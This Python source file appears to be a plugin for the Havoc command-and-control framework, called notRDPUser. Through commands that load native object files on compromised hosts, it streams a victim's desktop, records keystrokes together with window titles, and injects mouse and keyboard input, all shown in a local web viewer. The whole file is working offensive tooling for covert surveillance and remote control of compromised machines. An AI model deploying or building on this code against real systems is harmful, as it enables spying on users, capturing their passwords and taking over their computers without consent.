"""
Author:  Dhanush Arvind
Ported from gowdaC2
"""

from havoc import Demon, RegisterCommand
from struct import pack, calcsize

import base64
import json
import os
import re
import shutil
import signal
import subprocess
import sys
import tempfile
import time
import webbrowser


__version__ = "1.0.0"
__author__ = "Dhanush Arvind"

DEFAULT_VIEWER_PORT = 4445
DEFAULT_JPEG_QUALITY = 30

_bof_dir = None


def _get_bof_dir():
    global _bof_dir
    if _bof_dir is None:
        try:
            _bof_dir = os.path.dirname(os.path.abspath(__file__))
        except NameError:
            _bof_dir = os.getcwd()
    return _bof_dir


def set_bof_dir(path):
    global _bof_dir
    _bof_dir = path


class Packer:
    def __init__(self):
        self.buffer = b""
        self.size = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addint(self, val):
        self.buffer += pack("<i", val)
        self.size += 4

    def adduint32(self, val):
        self.buffer += pack("<I", val)
        self.size += 4

    def addstr(self, s):
        if s is None:
            s = ""
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s) + 1, s)
        self.size += calcsize(fmt)

    def addbool(self, b):
        self.buffer += pack("<I", 1 if b else 0)
        self.size += 4


VK_NAMES = {
    8: "Backspace", 9: "Tab", 13: "Enter", 16: "Shift", 17: "Ctrl",
    18: "Alt", 19: "Pause", 20: "CapsLock", 27: "Esc", 32: "Space",
    33: "PgUp", 34: "PgDn", 35: "End", 36: "Home",
    37: "Left", 38: "Up", 39: "Right", 40: "Down",
    44: "PrtSc", 45: "Insert", 46: "Delete",
    91: "Win", 92: "Win", 93: "Menu",
    106: "Num*", 107: "Num+", 109: "Num-", 110: "Num.", 111: "Num/",
    144: "NumLock", 145: "ScrollLock",
    160: "LShift", 161: "RShift", 162: "LCtrl", 163: "RCtrl",
    164: "LAlt", 165: "RAlt",
    186: ";", 187: "=", 188: ",", 189: "-", 190: ".", 191: "/", 192: "`",
    219: "[", 220: "\\", 221: "]", 222: "'",
}


def _vk_to_name(vk):
    if vk in VK_NAMES:
        return VK_NAMES[vk]
    if 48 <= vk <= 57:
        return chr(vk)
    if 65 <= vk <= 90:
        return chr(vk)
    if 96 <= vk <= 105:
        return "Num" + str(vk - 96)
    if 112 <= vk <= 123:
        return "F" + str(vk - 111)
    return "VK_%d" % vk


_streaming = {}
_demon_arch = {}
_server_proc = None
_viewer_port = DEFAULT_VIEWER_PORT
_shared_dir = None
_prev_keys = {}
_max_keylog_entries = 5000


def _get_screenshot_bof(arch):
    name = "screenshot.x86.o" if arch == "x86" else "screenshot.x64.o"
    return os.path.join(_get_bof_dir(), name)

def _get_screeninput_bof(arch):
    name = "screeninput.x86.o" if arch == "x86" else "screeninput.x64.o"
    return os.path.join(_get_bof_dir(), name)

def _get_keylogger_bof(arch):
    name = "keylogger.x86.o" if arch == "x86" else "keylogger.x64.o"
    return os.path.join(_get_bof_dir(), name)


def _init_shared_dir():
    global _shared_dir
    if _shared_dir is not None:
        return
    _shared_dir = os.path.join(tempfile.gettempdir(), "notrdpuser")
    os.makedirs(_shared_dir, exist_ok=True)

def _write_frame(demon_id, jpeg_bytes):
    _init_shared_dir()
    frame_path = os.path.join(_shared_dir, demon_id + ".jpg")
    try:
        with open(frame_path, "wb") as f:
            f.write(jpeg_bytes)
    except Exception:
        pass

def _update_demons_list():
    _init_shared_dir()
    demons = []
    for did in _streaming:
        d = {"id": did, "streaming": _streaming[did].get("active", False)}
        demons.append(d)
    demons_file = os.path.join(_shared_dir, "demons.json")
    try:
        with open(demons_file, "w") as f:
            json.dump(demons, f)
    except Exception:
        pass

def _read_and_clear_input(demon_id):
    _init_shared_dir()
    input_file = os.path.join(_shared_dir, demon_id + "_input.json")
    try:
        with open(input_file, "r") as f:
            commands = json.load(f)
        with open(input_file, "w") as f:
            json.dump([], f)
        return commands
    except (FileNotFoundError, json.JSONDecodeError):
        return []

def _append_keylog(demon_id, entries):
    _init_shared_dir()
    keylog_file = os.path.join(_shared_dir, demon_id + "_keylog.json")
    existing = []
    try:
        with open(keylog_file, "r") as f:
            existing = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        pass
    existing.extend(entries)
    if len(existing) > _max_keylog_entries:
        existing = existing[-_max_keylog_entries:]
    try:
        with open(keylog_file, "w") as f:
            json.dump(existing, f)
    except Exception:
        pass


def _debug_log(msg):
    try:
        _init_shared_dir()
        with open(os.path.join(_shared_dir, "debug.log"), "a") as f:
            f.write("%s\n" % msg)
    except Exception:
        pass


def _screenshot_callback(demonID, TaskID, worked, output, error):
    _debug_log("screenshot_cb: worked=%s output_len=%s error=%s" % (
        worked, len(output) if output else 0, str(error)[:100] if error else "None"))

    if error:
        try:
            demon = Demon(demonID)
            demon.ConsoleWrite(demon.CONSOLE_ERROR,
                "Screenshot BOF error: %s" % str(error)[:200])
        except Exception:
            pass

    if worked and output and "SCREENCAP:" in output:
        lines = output.strip().split("\n", 1)
        if len(lines) >= 2:
            b64data = lines[1].strip()
            match = re.match(r"SCREENCAP:(\d+)x(\d+):(\d+)", lines[0])
            if match:
                try:
                    jpeg_bytes = base64.b64decode(b64data)
                    if len(jpeg_bytes) >= 2 and jpeg_bytes[0:2] == b"\xff\xd8":
                        _write_frame(demonID, jpeg_bytes)
                        _debug_log("frame written: %d bytes" % len(jpeg_bytes))
                except Exception as e:
                    _debug_log("decode error: %s" % str(e))

    _process_pending_input(demonID)

    config = _streaming.get(demonID)
    if config and config.get("active"):
        try:
            demon = Demon(demonID)

            packer = Packer()
            packer.adduint32(config.get("quality", DEFAULT_JPEG_QUALITY))
            packer.addstr("")
            demon.InlineExecuteGetOutput(
                _screenshot_callback, "go",
                config["bof_path"], packer.getbuffer(),
            )

            keylogger_bof = config.get("keylogger_bof")
            if keylogger_bof:
                demon.InlineExecuteGetOutput(
                    _keylogger_callback, "go",
                    keylogger_bof, pack("<L", 0),
                )
        except Exception:
            config["active"] = False
            _update_demons_list()

    return True


def _keylogger_callback(demonID, TaskID, worked, output, error):
    if not worked or not output or "KEYLOG:" not in output:
        return True

    lines = output.strip().split("\n", 1)
    if not lines:
        return True

    header = lines[0]
    if not header.startswith("KEYLOG:"):
        return True

    window_title = header[7:]
    keys_str = lines[1].strip() if len(lines) > 1 else ""

    current_keys = set()
    if keys_str:
        for vk_str in keys_str.split():
            try:
                current_keys.add(int(vk_str))
            except ValueError:
                pass

    prev = _prev_keys.get(demonID, set())
    new_presses = current_keys - prev
    _prev_keys[demonID] = current_keys

    if new_presses:
        now = time.time()
        entries = []
        for vk in sorted(new_presses):
            entries.append({
                "ts": now,
                "window": window_title,
                "vk": vk,
                "key": _vk_to_name(vk),
            })
        _append_keylog(demonID, entries)

    return True


def _input_callback(demonID, TaskID, worked, output, error):
    _process_pending_input(demonID)
    return True


def _process_pending_input(demon_id):
    commands = _read_and_clear_input(demon_id)
    if not commands:
        return

    arch = _demon_arch.get(demon_id, "x64")
    input_bof = _get_screeninput_bof(arch)

    action_map_mouse = {
        "move": 0, "click": 1, "rightclick": 2,
        "dblclick": 3, "down": 4, "up": 5,
        "scroll": 6, "rightdown": 7, "rightup": 8,
    }
    action_map_kbd = {"press": 0, "down": 1, "up": 2}

    for cmd in commands:
        try:
            itype = 0 if cmd.get("input_type", "mouse") == "mouse" else 1
            if itype == 0:
                action = action_map_mouse.get(cmd.get("action", "click"), 1)
            else:
                action = action_map_kbd.get(cmd.get("action", "press"), 0)

            packer = Packer()
            packer.addint(itype)
            packer.addint(action)
            packer.addint(int(cmd.get("x", 0)))
            packer.addint(int(cmd.get("y", 0)))
            packer.addint(int(cmd.get("keycode", 0)))
            packer.addint(int(cmd.get("flags", 0)))
            packer.addstr("")

            demon = Demon(demon_id)
            demon.InlineExecuteGetOutput(
                _input_callback, "go", input_bof, packer.getbuffer(),
            )
        except Exception:
            pass


def _is_server_running():
    global _server_proc
    if _server_proc is not None:
        if _server_proc.poll() is None:
            return True
        _server_proc = None
    _init_shared_dir()
    pid_file = os.path.join(_shared_dir, "server.pid")
    try:
        with open(pid_file, "r") as f:
            pid = int(f.read().strip())
        os.kill(pid, 0)
        return True
    except (FileNotFoundError, ValueError, OSError):
        return False


def _start_viewer_server(port=None):
    global _server_proc, _viewer_port
    if port is not None and port != _viewer_port:
        _stop_viewer_server()
        _viewer_port = port
    elif port is not None:
        _viewer_port = port

    if _is_server_running():
        return True

    _init_shared_dir()

    server_script = os.path.join(_get_bof_dir(), "_viewer_server.py")
    viewer_html = os.path.join(_get_bof_dir(), "viewer.html")

    if not os.path.exists(server_script):
        return False

    shutil.copy2(server_script, _shared_dir)
    shutil.copy2(viewer_html, _shared_dir)

    server_path = os.path.join(_shared_dir, "_viewer_server.py")
    viewer_path = os.path.join(_shared_dir, "viewer.html")

    try:
        _server_proc = subprocess.Popen(
            [sys.executable, server_path, str(_viewer_port),
             _shared_dir, viewer_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        return True
    except Exception:
        _server_proc = None
        return False


def _stop_viewer_server():
    global _server_proc
    if _server_proc is not None:
        try:
            _server_proc.terminate()
            _server_proc.wait(timeout=3)
        except Exception:
            try:
                _server_proc.kill()
            except Exception:
                pass
        _server_proc = None

    _init_shared_dir()
    pid_file = os.path.join(_shared_dir, "server.pid")
    try:
        with open(pid_file, "r") as f:
            pid = int(f.read().strip())
        os.kill(pid, signal.SIGTERM)
    except (FileNotFoundError, ValueError, OSError):
        pass
    try:
        os.remove(pid_file)
    except OSError:
        pass


def on_notrdpuser(demonID, *args):
    demon = Demon(demonID)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        "Starting notRDPUser session...")

    arch = getattr(demon, "ProcessArch", "x64")
    screenshot_bof = _get_screenshot_bof(arch)
    keylogger_bof = _get_keylogger_bof(arch)

    if not os.path.exists(screenshot_bof):
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "BOF not found: %s" % os.path.basename(screenshot_bof))
        return TaskID
    if not os.path.exists(keylogger_bof):
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "BOF not found: %s" % os.path.basename(keylogger_bof))
        return TaskID

    if demonID in _streaming and _streaming[demonID].get("active"):
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Already running. Use notrdpuser-close first.")
        return TaskID

    port = DEFAULT_VIEWER_PORT
    quality = DEFAULT_JPEG_QUALITY
    params = [a for a in args if a]

    if len(params) >= 1:
        try:
            port = int(params[0])
            if port < 1 or port > 65535:
                raise ValueError
        except ValueError:
            demon.ConsoleWrite(demon.CONSOLE_ERROR,
                "Invalid port: %s (must be 1-65535)" % params[0])
            return TaskID

    if len(params) >= 2:
        try:
            quality = int(params[1])
            quality = max(1, min(100, quality))
        except ValueError:
            pass

    if not _start_viewer_server(port):
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Failed to start viewer server.")
        return TaskID

    _demon_arch[demonID] = arch
    _prev_keys[demonID] = set()

    _streaming[demonID] = {
        "quality": quality,
        "bof_path": screenshot_bof,
        "keylogger_bof": keylogger_bof,
        "active": True,
    }
    _update_demons_list()

    packer = Packer()
    packer.adduint32(quality)
    packer.addstr("")
    demon.InlineExecuteGetOutput(
        _screenshot_callback, "go", screenshot_bof, packer.getbuffer(),
    )

    demon.InlineExecuteGetOutput(
        _keylogger_callback, "go", keylogger_bof, pack("<L", 0),
    )

    viewer_url = "http://127.0.0.1:%d" % _viewer_port
    demon.ConsoleWrite(demon.CONSOLE_TASK,
        "notRDPUser session starting (%s, quality=%d)\n"
        "    Mode:     User desktop + keylogger\n"
        "    Viewer:   %s\n"
        "    Close:    notrdpuser-close"
        % (arch, quality, viewer_url))

    try:
        webbrowser.open(viewer_url)
    except Exception:
        pass

    return TaskID


def on_notrdpuser_close(demonID, *args):
    demon = Demon(demonID)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
        "Closing notRDPUser session...")

    config = _streaming.get(demonID)
    if config and config.get("active"):
        config["active"] = False
        _update_demons_list()
        _stop_viewer_server()
        demon.ConsoleWrite(demon.CONSOLE_TASK,
            "notRDPUser session stopped (viewer + keylogger shut down)")
    else:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "No active session. Start with: notrdpuser")

    _prev_keys.pop(demonID, None)
    _streaming.pop(demonID, None)

    return TaskID


RegisterCommand(
    on_notrdpuser, "", "notrdpuser",
    "Start user desktop streaming with keylogger",
    0, "[port] [quality]", "notrdpuser 4445 30",
)

RegisterCommand(
    on_notrdpuser_close, "", "notrdpuser-close",
    "Close the notRDPUser session",
    0, "", "",
)

try:
    import havocui
    havocui.messagebox(
        "notRDPUser v%s" % __version__,
        "Author: %s\n\n"
        "Commands:\n"
        "  notrdpuser [port] [quality]  - Stream user desktop + keylogger\n"
        "  notrdpuser-close             - Stop session\n\n"
        "Viewer opens at http://127.0.0.1:4445"
        % (__author__,),
    )
except Exception:
    pass
